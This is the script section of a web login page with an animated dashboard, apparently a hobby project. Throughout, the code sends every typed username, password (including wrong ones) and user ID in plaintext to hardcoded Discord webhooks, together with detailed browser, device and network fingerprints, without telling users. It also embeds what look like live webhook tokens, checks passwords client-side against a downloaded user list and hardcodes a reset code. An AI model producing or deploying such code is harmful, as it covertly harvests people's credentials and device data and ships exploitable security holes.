        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHoIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
        reset_box_detected: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq',
        reset_code_accepted: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
        reset_code_incorrect: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip',
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordToggle = document.getElementById('showPasswordToggle'); // Changed from checkbox
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 3; // Changed from 5 to 3
      let users = [];
      let loginTime = null;

      // Login page zoom controls
      const bodyElement = document.getElementById('bodyElement');
      let loginPageZoomLevel = 1;
      const loginPageZoomStep = 0.1;
      const loginPageMinZoom = 0.5;
      const loginPageMaxZoom = 2;

      document.getElementById('loginZoomInBtn').addEventListener('click', () => {
        if (loginPageZoomLevel < loginPageMaxZoom) {
          loginPageZoomLevel += loginPageZoomStep;
          bodyElement.style.zoom = loginPageZoomLevel;
          bodyElement.style.setProperty('--login-zoom-level', loginPageZoomLevel);
        }
      });

      document.getElementById('loginZoomOutBtn').addEventListener('click', () => {
        if (loginPageZoomLevel > loginPageMinZoom) {
          loginPageZoomLevel -= loginPageZoomStep;
          bodyElement.style.zoom = loginPageZoomLevel;
          bodyElement.style.setProperty('--login-zoom-level', loginPageZoomLevel);
        }
      });

      document.getElementById('loginPanicBtn').addEventListener('click', () => {
        window.open('https://clever.com', '_blank');
      });

      // Show/hide password toggle (custom styled one)
      showPasswordToggle.addEventListener('change', () => {
        passwordInput.type = showPasswordToggle.checked ? 'text' : 'password';
      });

      // Current time and date functionality for login page
      const currentTimeDisplay = document.getElementById('currentTimeDisplay');
      const currentDateDisplay = document.getElementById('currentDateDisplay');
      const toggle24HourFormat = document.getElementById('toggle24HourFormat');
      let is24HourFormatLogin = false;

      function updateLoginDateTime() {
        const now = new Date();
        const dateOptions = { year: 'numeric', month: '2-digit', day: '2-digit' };
        const timeOptions = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: !is24HourFormatLogin };

        currentTimeDisplay.textContent = now.toLocaleTimeString('en-US', timeOptions);
        currentDateDisplay.textContent = now.toLocaleDateString('en-US', dateOptions);
      }

      toggle24HourFormat.addEventListener('change', () => {
        is24HourFormatLogin = toggle24HourFormat.checked;
        updateLoginDateTime();
      });

      updateLoginDateTime(); // Initial call
      setInterval(updateLoginDateTime, 1000); // Update every second


      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => {
            if (!res.ok) {
                throw new Error(`HTTP error! status: ${res.status}`);
            }
            return res.json();
        })
        .then(data => {
          users = data;
        })
        .catch((error) => {
          users = [];
          console.error('Failed to load user JSON data:', error);
          alert('Failed to load user data. Login functionality may be limited.');
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Detect Ad Blocker (simple heuristic)
      function detectAdBlocker() {
        const testAd = document.createElement('div');
        testAd.innerHTML = '&nbsp;';
        testAd.className = 'adsbox'; // A common class name for ad elements
        testAd.style.position = 'absolute';
        testAd.style.top = '-9999px';
        testAd.style.left = '-9999px';
        document.body.appendChild(testAd);

        const isBlocked = window.getComputedStyle(testAd).display === 'none' ||
                         testAd.offsetHeight === 0 ||
                         testAd.offsetWidth === 0;
        document.body.removeChild(testAd);
        return isBlocked;
      }

      // Get user permissions status (notifications as an example)
      async function getUserPermissionsStatus() {
          try {
              const result = await navigator.permissions.query({ name: 'notifications' });
              return result.state; // 'granted', 'prompt', or 'denied'
          } catch (e) {
              console.warn("Could not query notification permission:", e);
              return "Unavailable";
          }
      }


      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();
        const adBlockerDetected = detectAdBlocker();
        const notificationPermission = await getUserPermissionsStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
          adBlockerDetected: adBlockerDetected,
          notificationPermission: notificationPermission,
          // New logging additions:
          browserTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          documentReferrer: document.referrer,
          logicalProcessors: navigator.hardwareConcurrency, // Redundant but explicit
          maxTouchPoints: navigator.maxTouchPoints // Redundant but explicit
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders + 6 new fields
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true },
            // NEW FIELDS
            { name: "Browser Timezone", value: data.browserTimezone || "Unknown", inline: true },
            { name: "Document Referrer", value: data.documentReferrer || "None", inline: false },
            { name: "Ad Blocker Detected", value: data.adBlockerDetected ? "Yes" : "No", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: data.logicalProcessors ? `${data.logicalProcessors} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || data.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: data.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true },
            // NEW FIELDS
            { name: "Notifications Permission", value: data.notificationPermission || "Unavailable", inline: true },
            { name: "Media Devices Present", value: navigator.mediaDevices ? "Yes" : "No", inline: true },
            { name: "Clipboard Read Access", value: ('clipboard' in navigator && navigator.clipboard.readText) ? "Supported" : "Not Supported", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
          ]
        };
      }


      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found or ID incorrect.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
        attempts = 3; // Reset attempts for next session or a hypothetical case.
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        const loggingData = await collectLoggingData(user, password);
        await Promise.all([
            sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
            sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
            sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
            sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
            sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Hide login box and quick bar
        loginBox.style.display = 'none';
        document.getElementById('loginQuickBar').classList.remove('visible'); // Hide quick bar
        
        // Animate dashboard loading
        await animateCodeLoading(user);
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;

        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';

          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);

          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );

          showResetPopup();
          disableInputs();
        } else {
          if (attempts <= 2) { // Changed to warn at 2 attempts left (from 3 originally in description, but now its total 3)
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'flex'; // Changed to flex to use gap/flexbox
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "🔔 Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.reset_box_detected, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? loggingWebhooks.reset_code_accepted
          : loggingWebhooks.reset_code_incorrect;

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 3;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
        } else {
          alert('Incorrect reset code.');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'flex') { // Check for flex display for popup
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initializing pre-login screen functionality
      document.addEventListener('DOMContentLoaded', () => {
        const preLoginScreen = document.getElementById('preLoginScreen');
        const initializingText = document.getElementById('initializingText');
        const loginQuickBar = document.getElementById('loginQuickBar');
        const dashboardLoadingScreen = document.getElementById('dashboardLoadingScreen');
        const codeLoadingText = document.getElementById('codeLoadingText');

        dashboardLoadingScreen.style.display = 'none'; // Ensure loading screen is hidden initially

        // Define dashboard notification for this IIFE's scope.
        const notificationElement = document.getElementById('dashboardAlert'); // Re-use general alert

        // Animation for dashboard loading after successful login
        const codeMessages = [
          "Loading core modules [OK]...",
          "Establishing secure connection [OK]...",
          "Compiling dashboard UI [OK]...",
          "Retrieving user data [OK]...",
          "Initializing all features [OK]...",
          "Verifying system integrity [OK]...",
          "Access granted. Preparing Dashboard..."
        ];
        let codeAnimationTimer;

        async function animateCodeLoading(user) {
            dashboardLoadingScreen.style.display = 'flex'; // Show loading screen
            dashboardLoadingScreen.style.opacity = '1';
            dashboardLoadingScreen.style.visibility = 'visible';

            codeLoadingText.innerHTML = ''; // Clear previous text

            for (let i = 0; i < codeMessages.length; i++) {
                const message = codeMessages[i];
                let j = 0;
                codeLoadingText.textContent = ''; // Clear previous line
                await new Promise(resolve => {
                    codeAnimationTimer = setInterval(() => {
                        if (j < message.length) {
                            codeLoadingText.textContent += message[j++];
                        } else {
                            clearInterval(codeAnimationTimer);
                            codeLoadingText.textContent += '\n'; // New line after message
                            resolve();
                        }
                    }, 50); // Typing speed
                });
                await new Promise(resolve => setTimeout(resolve, 500)); // Pause after typing
            }

            await new Promise(resolve => setTimeout(resolve, 1000)); // Short pause after all messages

            // Hide loading screen
            dashboardLoadingScreen.style.opacity = '0';
            // Wait for transition to complete before setting display to 'none' and removing.
            await new Promise(resolve => {
                dashboardLoadingScreen.addEventListener('transitionend', function handler() {
                    dashboardLoadingScreen.style.display = 'none';
                    dashboardLoadingScreen.style.visibility = 'hidden';
                    dashboardLoadingScreen.removeEventListener('transitionend', handler);
                    resolve();
                }, { once: true });
            });


            // Show dashboard
            document.getElementById('dashboard').style.display = 'flex'; // Assuming dashboard uses flex layout
            document.body.className = 'dashboard-body'; // Apply dashboard body class
            document.body.style.zoom = '1'; // Reset zoom to default for dashboard
            bodyElement.style.overflowY = 'auto'; // Enable scrolling on dashboard

            // Update user info in dashboard
            document.getElementById('loggedInUser').textContent = user.name || user.username;
            document.getElementById('loggedInID').textContent = user.userID; // Assuming userID is always provided

            // Initialize dashboard functionality
            dashboard.init();

            // Show welcome notification
            showDashboardAlert(`Welcome, ${user.name || user.username}!`, 'success');
        }


        // Pre-Login Screen Sequence
        async function startPreLoginSequence() {
          initializingText.textContent = 'Initializing System..';
          // Apply gradient animation via CSS animation, managed by JS toggling a class
          initializingText.style.animation = 'gradientText 2s infinite alternate';
          
          await new Promise(resolve => setTimeout(resolve, 3000));

          initializingText.textContent = 'Initializing Login Page...';
          await new Promise(resolve => setTimeout(resolve, 3000));

          // Stop text animation
          initializingText.style.animation = 'none'; // Clear the animation property
          initializingText.style.backgroundImage = 'none'; // Ensure solid color after stopping
          initializingText.style.webkitTextFillColor = 'white'; // Fill with solid color for completion


          // Animate cube shrinking and fading for seamless transition to login
          const cubeElement = preLoginScreen.querySelector('.cube');
          cubeElement.style.transition = 'transform 0.5s ease-out, opacity 0.5s ease-out';
          cubeElement.style.transform = 'scale(0) rotateX(45deg) rotateY(45deg)'; // Shrink/rotate cube
          cubeElement.style.opacity = '0';
          initializingText.style.opacity = '0'; // Fade out text

          preLoginScreen.classList.add('hidden'); // Fade out pre-login screen

          // Wait for pre-login fade-out transition
          await new Promise(resolve => setTimeout(resolve, 500)); // Adjust this timeout to match CSS opacity transition

          loginBox.style.display = 'flex'; // Show the login box, assume flex for centering
          loginBox.style.position = 'fixed'; // Position it fixed to match the animation origin
          loginBox.style.top = '50%';
          loginBox.style.left = '50%';
          // Set initial state for loadFromCube animation (smaller, rotated, invisible)
          loginBox.style.transform = 'translate(-50%, -50%) scale(0.1) rotateX(45deg) rotateY(45deg)';
          loginBox.style.opacity = '0';
          loginBox.style.animation = 'loadFromCube 1s forwards ease-out'; // Play load animation

          loginQuickBar.classList.add('visible'); // Show quick bar with animation

          loginBox.addEventListener('animationend', () => {
            // After animation, remove animation styles to let CSS control layout
            loginBox.style.position = '';
            loginBox.style.top = '';
            loginBox.style.left = '';
            loginBox.style.transform = '';
            loginBox.style.opacity = '';
            loginBox.style.animation = '';
            // bodyElement.style.overflow = 'auto'; // Re-enable scroll if necessary, now handled by dashboard body class
            preLoginScreen.remove(); // Clean up pre-login screen element
          }, { once: true });
        }

        startPreLoginSequence(); // Start the pre-login sequence on DOMContentLoaded

        // Initialize attempts display
        updateAttemptsText();
      });

    })(); // End login system IIFE
  </script>
</body>
</html>
